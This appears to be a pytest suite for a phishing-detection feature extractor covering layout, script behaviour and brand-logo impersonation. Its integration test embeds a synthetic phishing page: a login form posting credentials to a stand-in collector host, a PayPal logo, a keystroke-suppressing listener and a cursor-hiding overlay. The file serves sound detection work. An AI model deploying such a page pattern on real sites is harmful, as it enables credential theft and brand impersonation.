"""Unit tests for the live-page analysis features, plus one real-browser check.

The extractor tests deliberately hand-build the probe dictionaries instead of
rendering pages: the contract under test is "given what was observed, produce
this fixed-length vector, and never raise", and that contract is only
meaningfully testable without a browser in the way.

The single integration test at the bottom is the exception. It drives real
Chromium over a ``data:`` URL carrying injected HTML â€” never the public internet,
never a live phishing host â€” and skips cleanly when Playwright's Chromium is not
installed on the host.
"""

from __future__ import annotations

import sys
from pathlib import Path
from typing import Any
from urllib.parse import quote

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from app.preprocessing.page_analysis import (  # noqa: E402
    BRANDIMG_FEATURE_NAMES,
    DEFAULT_BRANDS,
    LAYOUT_FEATURE_NAMES,
    N_BEHAVIOR_FEATURES,
    N_BRANDIMG_FEATURES,
    N_LAYOUT_FEATURES,
    BEHAVIOR_FEATURE_NAMES,
    extract_behavior_features,
    extract_brand_image_features,
    extract_layout_features,
)
from app.services.page_probe import PageProbeResult  # noqa: E402


def _layout_index(name: str) -> int:
    return LAYOUT_FEATURE_NAMES.index(name)


def _behavior_index(name: str) -> int:
    return BEHAVIOR_FEATURE_NAMES.index(name)


def _brand_index(name: str) -> int:
    return BRANDIMG_FEATURE_NAMES.index(name)


def _box(x: float, y: float, w: float = 200.0, h: float = 30.0, **extra: Any) -> dict:
    record = {"x": x, "y": y, "w": w, "h": h, "visible": True}
    record.update(extra)
    return record


# --------------------------------------------------------------------------- #
# Shape and totality contracts
# --------------------------------------------------------------------------- #


def test_layout_vector_has_fixed_width() -> None:
    assert len(extract_layout_features({})) == N_LAYOUT_FEATURES == len(LAYOUT_FEATURE_NAMES)


def test_behavior_vector_has_fixed_width() -> None:
    vec = extract_behavior_features({})
    assert len(vec) == N_BEHAVIOR_FEATURES == len(BEHAVIOR_FEATURE_NAMES)


def test_brand_vector_has_fixed_width() -> None:
    vec = extract_brand_image_features([])
    assert len(vec) == N_BRANDIMG_FEATURES == len(BRANDIMG_FEATURE_NAMES)


def test_feature_names_are_unique_and_stable() -> None:
    """Order and spelling are the fitted scaler's contract; duplicates or renames
    would silently shift every downstream column."""
    for names in (LAYOUT_FEATURE_NAMES, BEHAVIOR_FEATURE_NAMES, BRANDIMG_FEATURE_NAMES):
        assert len(set(names)) == len(names)
        assert all(name == name.strip() and " " not in name for name in names)
    assert LAYOUT_FEATURE_NAMES[0] == "n_input_fields"
    assert BEHAVIOR_FEATURE_NAMES[0] == "js_error_count"
    assert BRANDIMG_FEATURE_NAMES[0] == "n_images"


@pytest.mark.parametrize("bad", [None, {}, [], "nonsense", 42, {"inputs": "nope"}])
def test_malformed_layout_input_returns_zeros(bad: Any) -> None:
    vec = extract_layout_features(bad)
    assert len(vec) == N_LAYOUT_FEATURES
    assert vec == [0.0] * N_LAYOUT_FEATURES


@pytest.mark.parametrize("bad", [None, {}, [], "nonsense", {"js_errors": "many"}])
def test_malformed_behavior_input_returns_zeros(bad: Any) -> None:
    vec = extract_behavior_features(bad)
    assert len(vec) == N_BEHAVIOR_FEATURES
    assert vec == [0.0] * N_BEHAVIOR_FEATURES


@pytest.mark.parametrize("bad", [None, [], "nonsense", [None, 3, "img"]])
def test_malformed_image_input_never_raises(bad: Any) -> None:
    vec = extract_brand_image_features(bad)
    assert len(vec) == N_BRANDIMG_FEATURES
    assert vec == [0.0] * N_BRANDIMG_FEATURES


def test_image_record_with_no_observable_attributes_scores_only_the_count() -> None:
    """A record that exists is still an image; its missing attributes are unknown,
    not zero-sized, so they must not invent signals."""
    vec = extract_brand_image_features([{"src": None}])
    assert vec[_brand_index("n_images")] == 1.0
    assert vec[_brand_index("n_images_without_alt")] == 1.0
    for name in ("n_brand_token_images", "n_foreign_domain_images", "n_base64_images",
                 "n_zero_rendered_images", "n_tiny_images", "brand_impersonation_any"):
        assert vec[_brand_index(name)] == 0.0


def test_non_finite_numbers_are_treated_as_absent() -> None:
    layout = {"viewport_width": float("nan"), "overlapping_pairs": float("inf")}
    assert extract_layout_features(layout) == [0.0] * N_LAYOUT_FEATURES


# --------------------------------------------------------------------------- #
# Layout
# --------------------------------------------------------------------------- #


def test_layout_counts_fields_and_password_fields() -> None:
    layout = {
        "inputs": [_box(10, 100), _box(10, 140), _box(10, 180)],
        "password_fields": [_box(10, 140)],
    }
    vec = extract_layout_features(layout)
    assert vec[_layout_index("n_input_fields")] == 3.0
    assert vec[_layout_index("n_password_fields")] == 1.0
    assert vec[_layout_index("has_password_field")] == 1.0


def test_password_field_vertical_position_spans_zero_to_one() -> None:
    """0 = credential box at the very top of the page, 1 = at the very bottom."""
    common = {"viewport_width": 1280.0, "viewport_height": 800.0, "scroll_height": 800.0}
    top = extract_layout_features({**common, "password_fields": [_box(10, 10)]})
    bottom = extract_layout_features({**common, "password_fields": [_box(10, 770)]})
    assert top[_layout_index("password_vertical_position")] == pytest.approx(25 / 800)
    assert bottom[_layout_index("password_vertical_position")] > 0.9


def test_password_fields_recovered_from_is_password_flag() -> None:
    """A probe that only tags the input records must still yield the signal."""
    layout = {"inputs": [_box(0, 0, is_password=True), _box(0, 40)]}
    vec = extract_layout_features(layout)
    assert vec[_layout_index("n_password_fields")] == 1.0


def test_centre_deviation_is_zero_for_a_centred_form() -> None:
    layout = {"viewport_width": 1280.0, "form": {"x": 440.0, "y": 100.0, "w": 400.0, "h": 300.0}}
    vec = extract_layout_features(layout)
    assert vec[_layout_index("form_center_deviation")] == pytest.approx(0.0)
    assert vec[_layout_index("form_width_fraction")] == pytest.approx(400 / 1280)


def test_password_offset_from_viewport_centre_measures_displacement() -> None:
    common = {"viewport_width": 1000.0, "viewport_height": 800.0}
    centred = extract_layout_features(
        {**common, "password_fields": [{"x": 400.0, "y": 385.0, "w": 200.0, "h": 30.0}]}
    )
    cornered = extract_layout_features(
        {**common, "password_fields": [{"x": 0.0, "y": 0.0, "w": 200.0, "h": 30.0}]}
    )
    assert centred[_layout_index("password_offset_from_viewport_center")] == pytest.approx(0.0)
    assert cornered[_layout_index("password_offset_from_viewport_center")] > 0.4


def test_below_fold_offscreen_and_hidden_inputs_are_counted_separately() -> None:
    layout = {
        "viewport_width": 1280.0,
        "viewport_height": 800.0,
        "scroll_height": 2000.0,
        "doc_width": 1280.0,
        "inputs": [
            _box(10, 100),          # visible, above the fold
            _box(10, 1500),         # visible, below the fold
            _box(10, 2500),         # visible, entirely past the document
            _box(10, 100, visible=False),
        ],
    }
    vec = extract_layout_features(layout)
    assert vec[_layout_index("n_inputs_below_fold")] == 2.0
    assert vec[_layout_index("n_offscreen_inputs")] == 1.0
    assert vec[_layout_index("n_hidden_inputs")] == 1.0


def test_overlap_counters_are_passed_through() -> None:
    vec = extract_layout_features({"overlapping_pairs": 7, "max_overlap_ratio": 0.83})
    assert vec[_layout_index("n_overlapping_pairs")] == 7.0
    assert vec[_layout_index("max_overlap_ratio")] == pytest.approx(0.83)


def test_aspect_anomalies_flag_a_stretched_form() -> None:
    """A 900x100 bar-form is not a login card; the anomaly grows with the stretch."""
    card = extract_layout_features(
        {"viewport_width": 1280.0, "form": {"x": 0.0, "y": 0.0, "w": 360.0, "h": 480.0}}
    )
    bar = extract_layout_features(
        {"viewport_width": 1280.0, "form": {"x": 0.0, "y": 0.0, "w": 900.0, "h": 100.0}}
    )
    assert card[_layout_index("form_aspect_anomaly")] == pytest.approx(0.0)
    assert bar[_layout_index("form_aspect_anomaly")] > 8.0


def test_page_aspect_anomaly_flags_a_short_page() -> None:
    single_screen = extract_layout_features({"viewport_width": 1000.0, "scroll_height": 1780.0})
    long_page = extract_layout_features({"viewport_width": 1000.0, "scroll_height": 9000.0})
    assert single_screen[_layout_index("page_aspect_anomaly")] == pytest.approx(0.0)
    assert long_page[_layout_index("page_aspect_anomaly")] > 7.0


def test_click_target_size_anomalies() -> None:
    layout = {
        "click_targets": [
            _box(0, 0, 200, 40),
            _box(0, 50, 30, 30),
            _box(0, 100, 3, 3),
            _box(0, 150, 0, 0),
        ]
    }
    vec = extract_layout_features(layout)
    assert vec[_layout_index("n_small_click_targets")] == 2.0
    assert vec[_layout_index("n_zero_size_controls")] == 1.0
    # Zero-area controls are excluded so they cannot drag the mean to zero.
    assert vec[_layout_index("mean_control_width")] == pytest.approx((200 + 30 + 3) / 3)


def test_form_controls_are_the_ones_inside_the_form_box() -> None:
    layout = {
        "form": {"x": 400.0, "y": 100.0, "w": 300.0, "h": 200.0},
        "click_targets": [_box(410, 110), _box(410, 150), _box(0, 0)],
        "n_forms": 2,
    }
    vec = extract_layout_features(layout)
    assert vec[_layout_index("n_form_controls")] == 2.0
    assert vec[_layout_index("n_forms")] == 2.0


def test_vertical_rhythm_consistency_is_one_for_uniform_spacing() -> None:
    uniform = extract_layout_features({"vertical_gaps": [16, 16, 16, 16]})
    erratic = extract_layout_features({"vertical_gaps": [3, 180, 11, 640, 7]})
    assert uniform[_layout_index("vertical_rhythm_consistency")] == pytest.approx(1.0)
    assert erratic[_layout_index("vertical_rhythm_consistency")] < 0.3


def test_vertical_rhythm_needs_at_least_two_gaps() -> None:
    vec = extract_layout_features({"vertical_gaps": [16]})
    assert vec[_layout_index("vertical_rhythm_consistency")] == 0.0


# --------------------------------------------------------------------------- #
# Behaviour
# --------------------------------------------------------------------------- #


def test_runtime_error_counters_are_forwarded() -> None:
    behavior = {
        "js_errors": 3,
        "unhandled_rejections": 2,
        "window_open_calls": 1,
        "dialogs_dismissed": 1,
    }
    vec = extract_behavior_features(behavior)
    assert vec[_behavior_index("js_error_count")] == 3.0
    assert vec[_behavior_index("unhandled_rejection_count")] == 2.0
    assert vec[_behavior_index("window_open_calls")] == 1.0
    assert vec[_behavior_index("dialogs_auto_dismissed")] == 1.0


def test_dynamic_code_decoders_are_summed_into_one_signal() -> None:
    vec = extract_behavior_features(
        {"atob_calls": 2, "unescape_calls": 1, "from_char_code_calls": 5}
    )
    assert vec[_behavior_index("dynamic_code_decoders")] == 8.0
    assert vec[_behavior_index("dynamic_code_any")] == 1.0


def test_eval_alone_flips_the_dynamic_code_flag() -> None:
    assert extract_behavior_features({"eval_calls": 1})[_behavior_index("dynamic_code_any")] == 1.0
    quiet = extract_behavior_features({"script_count": 12})
    assert quiet[_behavior_index("dynamic_code_any")] == 0.0


def test_post_load_navigation_count_prefers_the_derived_counter() -> None:
    derived = extract_behavior_features({"post_load_navigations": 5, "navigations": 1})
    fallback = extract_behavior_features({"navigations": 1})
    assert derived[_behavior_index("post_load_navigations")] == 5.0
    assert fallback[_behavior_index("post_load_navigations")] == 1.0


def test_external_script_ratio_is_guarded_against_zero_scripts() -> None:
    ratio = extract_behavior_features({"script_count": 4, "external_script_count": 3})
    assert ratio[_behavior_index("external_script_ratio")] == pytest.approx(0.75)
    none = extract_behavior_features({"script_count": 0, "external_script_count": 0})
    assert none[_behavior_index("external_script_ratio")] == 0.0


def test_interception_and_exfiltration_counters() -> None:
    behavior = {
        "keyboard_event_intercepts": 2,
        "keystroke_suppressions": 9,
        "paste_event_intercepts": 1,
        "clipboard_access_attempts": 1,
        "permission_queries": 2,
        "fullscreen_requests": 1,
        "timer_redirects": 1,
        "timers_registered": 40,
    }
    vec = extract_behavior_features(behavior)
    assert vec[_behavior_index("keyboard_event_intercepts")] == 2.0
    assert vec[_behavior_index("keystroke_suppressions")] == 9.0
    assert vec[_behavior_index("clipboard_access_attempts")] == 1.0
    assert vec[_behavior_index("fullscreen_requests")] == 1.0
    assert vec[_behavior_index("timer_redirects")] == 1.0
    assert vec[_behavior_index("total_timers_registered")] == 40.0


def test_cross_origin_form_action_flag() -> None:
    assert extract_behavior_features({"form_action_cross_origin": 1})[
        _behavior_index("form_action_cross_origin")
    ] == 1.0


def test_obfuscated_inline_script_hits_contribute_to_dynamic_code() -> None:
    vec = extract_behavior_features({"script_count": 2, "obfuscated_script_hits": 4})
    assert vec[_behavior_index("obfuscated_script_hits")] == 4.0
    assert vec[_behavior_index("dynamic_code_any")] == 1.0


def test_frames_probed_is_a_count_not_a_boolean() -> None:
    vec = extract_behavior_features({"frames_probed": 3})
    assert vec[_behavior_index("frames_with_scripts")] == 3.0


def test_empty_submission_without_gesture_is_tracked() -> None:
    vec = extract_behavior_features({"form_submits_without_gesture": 1})
    assert vec[_behavior_index("form_submits_without_gesture")] == 1.0


# --------------------------------------------------------------------------- #
# Brand / logo impersonation
# --------------------------------------------------------------------------- #


def _img(src: str, host: str, **extra: Any) -> dict:
    record = {"src": src, "alt": "", "title": "", "page_host": host}
    record.update(extra)
    return record


def test_brand_token_in_alt_counts_as_a_brand_image() -> None:
    vec = extract_brand_image_features(
        [_img("https://host.tld/a.png", "host.tld", alt="PayPal secure logo")]
    )
    assert vec[_brand_index("n_brand_token_images")] == 1.0
    assert vec[_brand_index("n_brand_token_hits")] == 1.0


def test_brand_image_on_a_foreign_host_is_an_impersonation() -> None:
    """The core claim: a PayPal logo on a host that is not PayPal."""
    vec = extract_brand_image_features(
        [_img("https://cdn.paypal.com/logo.png", "login-secure.tk", alt="PayPal")]
    )
    assert vec[_brand_index("n_brand_host_mismatch_images")] == 1.0
    assert vec[_brand_index("brand_impersonation_any")] == 1.0
    assert vec[_brand_index("n_distinct_brand_impersonations")] == 1.0


def test_brand_image_on_its_own_host_is_not_an_impersonation() -> None:
    vec = extract_brand_image_features(
        [_img("https://www.paypal.com/logo.png", "www.paypal.com", alt="PayPal")]
    )
    assert vec[_brand_index("n_brand_token_images")] == 1.0
    assert vec[_brand_index("brand_impersonation_any")] == 0.0


def test_brand_token_in_the_filename_is_tracked_separately() -> None:
    vec = extract_brand_image_features(
        [_img("https://host.tld/static/netflix-logo-v2.png", "host.tld")]
    )
    assert vec[_brand_index("n_brand_in_filename")] == 1.0
    assert vec[_brand_index("n_logoish_images")] == 1.0


def test_multiple_impersonated_brands_are_counted_distinctly() -> None:
    vec = extract_brand_image_features(
        [
            _img("https://host.tld/paypal.png", "host.tld"),
            _img("https://host.tld/wells-fargo.png", "host.tld"),
            _img("https://host.tld/decor.png", "host.tld"),
        ]
    )
    assert vec[_brand_index("n_brand_token_images")] == 2.0
    assert vec[_brand_index("n_distinct_brand_impersonations")] == 2.0


def test_caller_supplied_brand_list_overrides_the_default() -> None:
    images = [_img("https://host.tld/acme.svg", "host.tld", alt="Acme Corp")]
    default = extract_brand_image_features(images)
    custom = extract_brand_image_features(images, brands=["acme"])
    assert default[_brand_index("brand_impersonation_any")] == 0.0
    assert custom[_brand_index("brand_impersonation_any")] == 1.0


def test_registrable_domain_comparison_ignores_subdomains_only() -> None:
    """A logo on the page's own CDN is not a foreign domain; one on a lookalike is."""
    same_zone = extract_brand_image_features(
        [_img("https://cdn.host.tld/logo.png", "www.host.tld")], brands=["acme"]
    )
    other_zone = extract_brand_image_features(
        [_img("https://cdn.attacker.tld/logo.png", "www.host.tld")], brands=["acme"]
    )
    assert same_zone[_brand_index("n_foreign_domain_images")] == 0.0
    assert other_zone[_brand_index("n_foreign_domain_images")] == 1.0
    assert other_zone[_brand_index("foreign_domain_ratio")] == pytest.approx(1.0)


def test_suspicious_image_extension_is_flagged() -> None:
    vec = extract_brand_image_features([_img("https://host.tld/banner.php", "host.tld")])
    assert vec[_brand_index("n_suspicious_ext_images")] == 1.0
    svg = extract_brand_image_features([_img("https://host.tld/logo.svg", "host.tld")])
    assert svg[_brand_index("n_suspicious_ext_images")] == 0.0


def test_base64_embedded_image_is_flagged() -> None:
    vec = extract_brand_image_features(
        [_img("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=", "host.tld")]
    )
    assert vec[_brand_index("n_base64_images")] == 1.0
    assert vec[_brand_index("n_foreign_domain_images")] == 0.0


def test_tiny_and_zero_rendered_images_are_counted() -> None:
    vec = extract_brand_image_features(
        [
            _img("https://host.tld/spacer.png", "host.tld", natural_width=1, natural_height=1),
            _img("https://host.tld/hidden.png", "host.tld", rendered_width=0, rendered_height=0),
        ]
    )
    assert vec[_brand_index("n_tiny_images")] == 1.0
    assert vec[_brand_index("n_zero_rendered_images")] == 1.0


def test_alt_presence_is_tracked() -> None:
    vec = extract_brand_image_features(
        [
            _img("https://host.tld/a.png", "host.tld", alt="a"),
            _img("https://host.tld/b.png", "host.tld"),
        ]
    )
    assert vec[_brand_index("n_images")] == 2.0
    assert vec[_brand_index("n_images_with_alt")] == 1.0
    assert vec[_brand_index("n_images_without_alt")] == 1.0


def test_default_brand_list_covers_the_documented_tokens() -> None:
    for token in ("paypal", "microsoft", "apple", "amazon", "netflix", "google",
                  "facebook", "instagram", "bank"):
        assert token in DEFAULT_BRANDS


# --------------------------------------------------------------------------- #
# Probe result contract (no browser needed)
# --------------------------------------------------------------------------- #


def test_probe_result_requires_explicit_available() -> None:
    """Mirrors the screenshot service: a result must never read as a success by
    default, or an unprobeable page would silently enter the model."""
    with pytest.raises(TypeError):
        PageProbeResult(url="http://x")  # type: ignore[call-arg]
    empty = PageProbeResult(url="http://x", available=False)
    assert empty.layout == {} and empty.behavior == {} and empty.images == []


# --------------------------------------------------------------------------- #
# Integration: real Chromium, local data: URL only
# --------------------------------------------------------------------------- #

_CHROMIUM: dict[str, Any] = {"checked": False, "ok": False, "reason": ""}


def _has_playwright() -> bool:
    try:
        import playwright  # noqa: F401

        return True
    except Exception:
        return False


_PLAYWRIGHT_MISSING = pytest.mark.skipif(
    not _has_playwright(),
    reason="playwright is not installed in this environment",
)


async def _require_chromium() -> None:
    """Skip cleanly when Playwright's browser download is missing."""
    if not _CHROMIUM["checked"]:
        try:
            from playwright.async_api import async_playwright

            from app.services.screenshot import SCREENSHOT_HARDENING_ARGS, _safe_close

            pw = await async_playwright().start()
            browser = await pw.chromium.launch(
                headless=True,
                args=SCREENSHOT_HARDENING_ARGS,
                chromium_sandbox=False,
                timeout=20_000,
            )
            await _safe_close(browser)
            await pw.stop()
            _CHROMIUM["ok"] = True
        except Exception as exc:  # pragma: no cover - depends on host install
            _CHROMIUM["ok"] = False
            _CHROMIUM["reason"] = f"{type(exc).__name__}: {exc}"[:200]
        _CHROMIUM["checked"] = True
    if not _CHROMIUM["ok"]:
        pytest.skip(f"Chromium unavailable: {_CHROMIUM['reason']}")


#: Self-contained HTML exercising every collector: a two-field login form, a
#: brand logo from a CDN, a full-viewport cursor-suppressing overlay, a popup,
#: a runtime error, a capture-phase key listener and a scripted redirect timer.
_PROBE_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>Sign in</title></head>
<body style="margin:0;height:4000px">
  <div id="trap" style="position:fixed;left:0;top:0;width:900px;height:700px;cursor:none"></div>
  <form action="https://collector.invalid/grab"
        style="position:absolute;left:440px;top:200px;width:400px;height:220px">
    <input type="text" name="login_email" style="width:260px;height:32px">
    <input type="password" name="login_pass" style="width:260px;height:32px">
    <button type="button" style="width:90px;height:32px">Sign in</button>
  </form>
  <img id="brand" alt="PayPal logo" src="https://cdn.paypal.com/logo.png"
       style="position:absolute;left:440px;top:100px;width:120px;height:40px">
  <script>
    window.open('about:blank', '_blank');
    document.addEventListener('keydown', function (ev) { ev.stopImmediatePropagation(); }, true);
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'a', bubbles: true }));
    setTimeout(function () { window.location.hash = 'x'; }, 5);
    (function () { null.oops; })();
  </script>
</body></html>"""


@pytest.mark.asyncio
@pytest.mark.slow
@_PLAYWRIGHT_MISSING
async def test_probe_of_local_data_url_reports_real_signals() -> None:
    """End-to-end: instrumented Chromium over a data: URL, no network involved."""
    await _require_chromium()

    from app.services.page_probe import PageProbe

    url = "data:text/html;charset=utf-8," + quote(_PROBE_HTML)
    async with PageProbe(settle_ms=1_500, nav_timeout_ms=10_000) as probe:
        result = await probe.probe(url)

    assert result.available is True, f"probe failed: {result.reason}"
    assert result.reason is None

    layout = extract_layout_features(result.layout)
    assert layout[_layout_index("n_input_fields")] == 2.0
    assert layout[_layout_index("n_password_fields")] == 1.0
    assert layout[_layout_index("has_password_field")] == 1.0
    assert layout[_layout_index("n_forms")] == 1.0
    assert layout[_layout_index("n_form_controls")] == 3.0
    assert result.layout["viewport_width"] > 0

    behavior = extract_behavior_features(result.behavior)
    assert behavior[_behavior_index("window_open_calls")] >= 1.0
    assert behavior[_behavior_index("js_error_count")] >= 1.0
    assert behavior[_behavior_index("keyboard_event_intercepts")] >= 1.0
    assert behavior[_behavior_index("keystroke_suppressions")] >= 1.0
    assert behavior[_behavior_index("timer_redirects")] >= 1.0
    assert behavior[_behavior_index("frames_with_scripts")] >= 1.0
    assert behavior[_behavior_index("form_action_cross_origin")] == 1.0
    # The cursor-suppressing full-viewport overlay the page installs.
    assert result.behavior["fake_cursor_overlays"] == 1

    brand = extract_brand_image_features(result.images)
    assert brand[_brand_index("n_images")] == 1.0
    assert brand[_brand_index("n_brand_token_images")] == 1.0
    assert brand[_brand_index("n_brand_in_alt_text")] == 1.0


@pytest.mark.asyncio
@pytest.mark.slow
@_PLAYWRIGHT_MISSING
async def test_probe_failure_is_reported_not_raised() -> None:
    """An unprobeable page is a masked signal with a reason, never an exception."""
    await _require_chromium()

    from app.services.page_probe import PageProbe

    async with PageProbe(settle_ms=0, nav_timeout_ms=4_000) as probe:
        # An unparseable URL fails before any network is attempted.
        bad = await probe.probe("not-a-url", timeout_ms=4_000)
        # .invalid is reserved by RFC 2606 and never resolves.
        dead = await probe.probe("http://page-probe-does-not-exist.invalid/", timeout_ms=4_000)

    assert bad.available is False and bad.reason
    assert dead.available is False and dead.reason
    assert dead.layout == {} and dead.behavior == {} and dead.images == []
    assert dead.elapsed_ms >= 0